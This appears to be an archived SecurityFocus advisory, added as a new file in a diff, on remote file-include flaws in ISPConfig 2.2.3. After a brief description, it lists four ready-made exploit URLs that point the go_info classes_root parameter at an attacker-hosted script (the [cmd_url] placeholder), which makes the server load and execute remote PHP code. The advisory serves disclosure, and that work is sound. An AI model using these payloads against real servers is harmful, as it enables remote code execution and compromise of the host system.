@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/18441/info
+
+ISPConfig is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.
+
+These issues affect version 2.2.3; other versions may also be vulnerable.
+
+The vendor reports a properly installed instance of ISPConfig is not vulnerable to these issues.
+
+http://www.example.com/[ic_path]/install_ispconfig/scripts/lib/server.inc.php?go_info[isp][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/lib/app.inc.php?go_info[server][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/login.php?go_info[server][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/trylogin.php?go_info[server][classes_root]=[cmd_url]/
